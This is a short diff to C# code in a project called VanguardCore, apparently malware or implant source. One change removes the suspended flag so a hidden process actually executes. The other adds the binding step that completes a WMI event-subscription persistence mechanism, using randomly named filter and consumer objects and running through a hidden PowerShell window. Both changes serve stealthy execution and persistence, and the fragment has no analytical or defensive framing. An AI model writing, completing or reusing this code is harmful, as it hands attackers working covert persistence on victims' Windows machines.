@@ -228,7 +228,7 @@ namespace VanguardCore
                     IntPtr.Zero,
                     IntPtr.Zero,
                     false,
-                    0x08000000 | 0x00000004, // CREATE_NO_WINDOW | CREATE_SUSPENDED
+                    0x08000000, // CREATE_NO_WINDOW (Removed SUSPENDED as it prevented execution)
                     IntPtr.Zero,
                     null,
                     ref si,
@@ -334,6 +334,11 @@ namespace VanguardCore
                     $consumer.Name = '{2}';
                     $consumer.CommandLineTemplate = '{3}';
                     $consumer.Put() | Out-Null;
+
+                    $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance();
+                    $binding.Filter = $filter.Path.RelPath;
+                    $binding.Consumer = $consumer.Path.RelPath;
+                    $binding.Put() | Out-Null;
                 ", query, GenerateRandomName(), GenerateRandomName(), action);
 
                 RunHidden("powershell.exe", string.Format("-w hidden -command \"{0}\"", cmd));
